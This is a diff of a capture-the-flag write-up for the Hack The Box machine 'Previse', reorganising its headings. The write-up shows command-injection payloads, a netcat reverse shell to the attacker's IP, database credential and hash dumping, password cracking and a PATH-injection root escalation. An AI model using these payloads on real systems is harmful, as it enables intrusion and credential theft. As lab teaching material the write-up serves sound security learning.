@@ -2,8 +2,9 @@
 IP address : 10.10.11.104\
 Operating System : Linux
 
-## Enumeration
-Lets start with running a network scan on the IP address using ```NMAP``` to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
+## Discovery
+### Nmap
+Lets start with running a network scan on the IP address using Nmap to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
 * sV : service detecttion
 * sC : Run default nmap scripts
 * A : Identify OS
@@ -11,21 +12,23 @@ Lets start with running a network scan on the IP address using ```NMAP``` to ide
 ```code
 sudo nmap -sC -sV -A -p- -T4 10.129.214.218 -vv 
 ```
-From the output of ```NMAP```, we can identify the following information about the open ports
+From the output of Nmap, we can identify the following information about the open ports
 | Port Number | Service | Version |
 |-----|------------------|----------------------|
 | 22	| SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
 | 80	| HTTP | Apache httpd 2.4.29 (Ubuntu) |
 
 
-## Discovery
+### Wapplyzer
 Visit http://10.10.11.104. Using ```Wapplyzer```, we discover the following information
 ```code
 Web servers : Apache 2.4.29
 Operating systems : Ubuntu
 Programming languages : PHP
 ```
-Knowing that the programming language used is ```PHP```, we will try to enumerate the directory for PHP files
+
+### Gobuster
+Knowing that the programming language used is ```PHP```, we will try to enumerate the directory for PHP files using Gobuster
 ```code
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ gobuster dir -u http://10.129.214.218 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -o out.log
@@ -59,10 +62,14 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /config.php           (Status: 200) [Size: 0]
 /logs.php             (Status: 302) [Size: 0] [--> login.php]
 ```
+
+### Web Content Discovery
 Navigate to http://10.10.11.104/nav.php, we are able to view a few hyperlinks. However, we notice that all of the links in this page redirect us to the ```login.php``` page. This tells us that we will first have to login before we can view the pages.
 ![Image of nav.php](https://github.com/joelczk/writeups/blob/main/HTB/Images/Previse/nav_php.PNG )
 
-Next, we will intercept the request made to ```CREATE ACCOUNT``` on the ```nav.php``` page using Burp Suite.
+## Exploit
+### Creating a new user
+We will then intercept the request made to ```CREATE ACCOUNT``` on the ```nav.php``` page using Burp Suite.
 
 The first request that we intercept is a ```GET``` request to the ```accounts.php``` page. For this request, we will just forward the request, but we will intercept the response to this request.
 <img src = "https://github.com/joelczk/writeups/blob/main/HTB/Images/Previse/accounts_php.PNG" width = "1000">
@@ -80,6 +87,8 @@ Afterwards, we will create a new user with the following credentials
 username: test1234
 password: test1234
 ```
+
+### Obtaining database credentials
 We will now login to the website with the created credentials, and we are able to find an interesting site ```files.php```, which allows us to download a ```SITEBACKUP.zip```. We will download the zip file and examine the files inside. 
 ```code
 ┌──(kali㉿kali)-[~/Desktop]
@@ -114,8 +123,12 @@ function connectDB(){
 
 ?>
 ```
+
+### Intercepting requests for log files
 We have also found an interesting site ```file_logs.php``` that seems to be storing the log data. We will intercept this request and examine it in Burp Suite. 
 ![Request to obtain file logs](https://github.com/joelczk/writeups/blob/main/HTB/Images/Previse/file_log.PNG)
+
+### Command Injection
 The payload for this request looks like it is vulnerable to command injection. We will create a POC for this exploit by creating a payload to send a ping command to our IP address, and we will use ```Wireshark``` to capture the requests and check for ```ping``` requests.
 ```code
 delim=comma%7Cping%20-n%2021%2010.10.16.250%7C%7C%60ping%20-c%2021%2010.10.16.250%60%20%23%27%20%7Cping%20-n%2021%2010.10.16.250%7C%7C%60ping%20-c%2021%2010.10.16.250%60%20%23%5C%22%20%7Cping%20-n%2021%2010.10.16.250
@@ -123,6 +136,7 @@ delim=comma%7Cping%20-n%2021%2010.10.16.250%7C%7C%60ping%20-c%2021%2010.10.16.25
 The ```ping``` requests were captured by wireshark, which proved that the POC worked.
 ![Ping requests captured](https://github.com/joelczk/writeups/blob/main/HTB/Images/Previse/ping_requests.PNG)
 
+### Obtaining a reverse shell
 Now all we have to do, is to create a reverse shell to connect to ```10.10.11.104```. The payload used is ```delim=comma%7Cnc%20-e%20%2Fbin%2Fsh%2010.10.16.250%203000``` and we will create a listening shell on the attacker machine. Afterwards, we will establish the shell.
 ```code
 ┌──(kali㉿kali)-[~/Desktop]
@@ -143,8 +157,9 @@ android-chrome-512x512.png  favicon-32x32.png  index.php   site.webmanifest
 apple-touch-icon.png        favicon.ico        js          status.php
 config.php                  file_logs.php      login.php
 css                         files.php          logout.php
-
 ```
+
+### Logging into SSH credentials
 Recall that we have obtained the SQL credentials, we will now try to login to the SQL server using the credentials. 
 ```code
 www-data@previse:/var/www/html$ mysql -u root -p
@@ -209,6 +224,7 @@ select * from accounts;
 mysql>
 ```
 
+### Cracking hash
 Now, we have obtained the hashed password to the user, we will save the hashed password to a file. For my case, I saved it to a file named ```password``` Afterwards, we will use ```John the Ripper``` to crack the hashed password. (NOTE: This might take some time!)
 * --wordlist : Defines the password list you are going to use for a dictionary attack
 * -format : Format of the hashed password
@@ -228,8 +244,8 @@ Session completed
 ?:ilovecody112235!
 
 1 password hash cracked, 0 left
-
 ```
+
 ## Obtaining user flag
 Using the cracked credentials, we will SSH into the server and obtain the user flag
 ```code
@@ -263,7 +279,7 @@ m4lwhere@previse:~$ cat user.txt
 m4lwhere@previse:~$  
 ```
 
-## Obtaining root flag
+## Path Injection
 First, we will try to find the programs with root privileges and we discovered that ```/opt/scripts/access_backup.sh``` can be executed with root privileges.
 ```code
 m4lwhere@previse:~$ sudo -l
@@ -271,7 +287,7 @@ m4lwhere@previse:~$ sudo -l
 User m4lwhere may run the following commands on previse:
     (root) /opt/scripts/access_backup.sh
 ```
-To escalate our privilege to root privileges, we will have to do some path injection. We would have to first a gzip file in our ```/tmp``` directory that will spawn a reverse shell. The reason why we write to the ```/tmp``` directory is because this directory is the only dierctory where we have permission to write to.
+To escalate our privilege to root privileges, we will have to do some path injection. We would have to first create a gzip file in our ```/tmp``` directory that will spawn a reverse shell. The reason why we write to the ```/tmp``` directory is because this directory is the only dierctory where we have permission to write to.
 ```code
 m4lwhere@previse:/$ ls -la
 total 100
@@ -322,7 +338,9 @@ m4lwhere@previse:/tmp$ echo $PATH
 /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
 ```
-We will receive the connection on the attacker's machine and we will be able to obtain the system flag
+
+### Obtaining root flag
+We will then receive the connection on the attacker's machine and we will be able to obtain the system flag
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nc -nlvp 3000                                                       24 ⚙
